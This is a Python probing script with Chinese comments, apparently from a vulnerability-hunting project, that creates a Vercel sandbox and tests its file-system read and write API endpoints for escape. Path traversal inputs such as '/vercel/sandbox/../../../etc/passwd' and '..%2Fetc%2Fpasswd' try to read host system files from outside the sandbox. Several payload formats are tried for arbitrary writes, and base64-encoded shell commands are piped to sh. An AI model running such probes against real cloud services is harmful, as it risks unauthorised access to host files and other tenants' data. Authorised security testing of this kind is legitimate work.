# -*- coding: utf-8 -*-
"""fs API 深挖 (v45e) - 新发现端点 /sessions/{sid}/fs/read|write
关键问题: 路径解析在 guest 内还是控制面/host 侧?
P1: fs/read 读 sandbox 内文件 (自己数据, 验证机制)
P2: fs/read 路径遍历/绝对路径 -> 是否越权读 host 文件?
P3: fs/write 写文件 -> 验证写原语
P4: fs/write 跨路径写 (写到 sandbox 之外?)"""
import base64, json, sys, time, urllib.request, urllib.error
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

NAME = 'fsapi45'

def mk():
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    time.sleep(3)
    for attempt in range(8):
        c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, {"projectId": PROJ, "name": NAME}, 60)
        if c == 429:
            print('[create] 429 retry %d' % (attempt + 1), flush=True)
            time.sleep(20)
            continue
        break
    print('[create] -> %s' % c, flush=True)
    if c != 200:
        sys.exit(1)
    return json.loads(r)['sandbox']['currentSessionId']

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

def api_raw(method, path, body=None, ctype='application/json', timeout=40):
    req = urllib.request.Request('https://api.vercel.com' + path, method=method)
    req.add_header('Authorization', 'Bearer ' + TOKEN)
    if ctype:
        req.add_header('Content-Type', ctype)
    data = body if isinstance(body, bytes) else (json.dumps(body).encode() if body is not None else None)
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode(errors='replace')[:800]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')[:800]
    except Exception as e:
        return -1, 'EXC %s' % e

from vercel_driver import TOKEN

if __name__ == '__main__':
    sid = mk()
    print('sid =', sid, flush=True)
    time.sleep(4)
    # 准备 marker 文件
    b64 = base64.b64encode(b'echo FS_API_TEST_123 > /vercel/sandbox/fs_marker.txt; cat /vercel/sandbox/fs_marker.txt').decode()
    c, r = cmd(sid, 'sh', ['-c', 'echo %s | base64 -d | sh' % b64], timeout_ms=20000)
    print('[marker] %s' % parse_data(r).strip()[:80], flush=True)

    print('=== P1: fs/read 读自己文件 ===', flush=True)
    for p in ['/vercel/sandbox/fs_marker.txt',
              '/vercel/sandbox/',
              '/',
              '/etc/passwd',
              '/vercel/sandbox/../../../etc/passwd',
              '../etc/passwd',
              '..%2Fetc%2Fpasswd']:
        c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/fs/read?teamId=%s' % (sid, TEAM), {"path": p})
        print('[read %s] -> %d %s' % (p, c, (r or '')[:200].replace('\n', ' ')), flush=True)
        time.sleep(1)

    print('=== P2: fs/read 变体 (GET / query / raw path) ===', flush=True)
    c, r = api_raw('GET', '/v2/sandboxes/sessions/%s/fs/read?path=/vercel/sandbox/fs_marker.txt&teamId=%s' % (sid, TEAM))
    print('[GET read] -> %d %s' % (c, (r or '')[:200]), flush=True)
    c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/fs/read?teamId=%s&path=/vercel/sandbox/fs_marker.txt' % (sid, TEAM), {})
    print('[POST read qpath] -> %d %s' % (c, (r or '')[:200]), flush=True)

    print('=== P3: fs/write 写文件 ===', flush=True)
    # 尝试多种 body 格式
    for tag, body, ctype in [
        ('json-content', {"path": "/vercel/sandbox/fs_written.txt", "content": "FS_WRITE_ABC"}, 'application/json'),
        ('json-data', {"path": "/vercel/sandbox/fs_written.txt", "data": "FS_WRITE_ABC"}, 'application/json'),
        ('json-base64', {"path": "/vercel/sandbox/fs_written.txt", "content": "RlNfV1JJVEVfQUJD"}, 'application/json'),
        ('octet', b'/vercel/sandbox/fs_written2.txt:FS_WRITE_DEF', 'application/octet-stream'),
        ('form', b'path=/vercel/sandbox/fs_written3.txt&content=FS_WRITE_GHI', 'application/x-www-form-urlencoded')]:
        c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/fs/write?teamId=%s' % (sid, TEAM), body, ctype)
        print('[write %s] -> %d %s' % (tag, c, (r or '')[:200].replace('\n', ' ')), flush=True)
        time.sleep(1)
    # 验证写入
    b64 = base64.b64encode(b'ls -la /vercel/sandbox/ | head; cat /vercel/sandbox/fs_written* 2>&1').decode()
    c, r = cmd(sid, 'sh', ['-c', 'echo %s | base64 -d | sh' % b64], timeout_ms=20000)
    print('[verify] %s' % parse_data(r).strip()[:200], flush=True)

    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    print('CLEANED', flush=True)
